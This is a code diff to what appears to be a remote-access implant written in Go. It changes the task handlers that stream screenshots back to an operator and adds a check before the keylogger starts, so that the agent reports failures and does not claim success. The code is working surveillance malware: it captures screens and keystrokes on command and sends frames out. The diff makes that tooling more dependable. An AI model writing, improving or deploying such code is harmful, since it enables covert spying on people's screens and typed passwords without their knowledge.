@@ -43,18 +43,33 @@ func handleScreenshot(task Task, res *TaskResult) {
 
 func handleScreenStreamStart(task Task, res *TaskResult) {
 	intervalSec, quality := parseScreenStreamSettings(task.Command)
-	if atomic.LoadInt32(&screenStreaming) == 0 {
-		atomic.StoreInt32(&screenStreaming, 1)
-		go func() {
-			for atomic.LoadInt32(&screenStreaming) == 1 {
-				data, err := takeScreenshotJPEG(quality)
-				if err == nil {
-					sendScreenFrame(data)
-				}
-				time.Sleep(time.Duration(intervalSec) * time.Second)
-			}
-		}()
+	if atomic.LoadInt32(&screenStreaming) == 1 {
+		res.Output = fmt.Sprintf("screen stream already running (interval=%ds quality=%d)", intervalSec, quality)
+		return
 	}
+	// Capture synchronously first so we never report "started" on a stream
+	// that cannot produce frames (headless/DUMMY display, no grabber, etc.).
+	first, err := takeScreenshotJPEG(quality)
+	if err != nil {
+		res.Error = "screen stream failed to start: " + err.Error()
+		return
+	}
+	atomic.StoreInt32(&screenStreaming, 1)
+	go func() {
+		sendScreenFrame(first)
+		for atomic.LoadInt32(&screenStreaming) == 1 {
+			time.Sleep(time.Duration(intervalSec) * time.Second)
+			data, err := takeScreenshotJPEG(quality)
+			if err != nil {
+				// Stop streaming rather than silently skipping errors and
+				// pretending the stream is healthy.
+				atomic.StoreInt32(&screenStreaming, 0)
+				sendScreenStreamError("screen stream stopped: " + err.Error())
+				return
+			}
+			sendScreenFrame(data)
+		}
+	}()
 	res.Output = fmt.Sprintf("screen stream started (interval=%ds quality=%d)", intervalSec, quality)
 }
 
@@ -118,6 +133,12 @@ func handleScreenshotWindow(task Task, res *TaskResult) {
 // ── Keylogger ───────────────────────────────────────────────────────────
 
 func handleKeyloggerStart(task Task, res *TaskResult) {
+	// The agent must not claim "keylogger started" on platforms where the
+	// loop is a no-op (Linux/macOS have no GetAsyncKeyState equivalent).
+	if err := keyloggerAvailable(); err != nil {
+		res.Error = "keylogger unavailable: " + err.Error()
+		return
+	}
 	// Compare-and-swap atomically claims the single active keylogger slot, so a
 	// second start (or a start racing a still-exiting loop) cannot launch a
 	// duplicate goroutine that would double-log and corrupt the buffer.
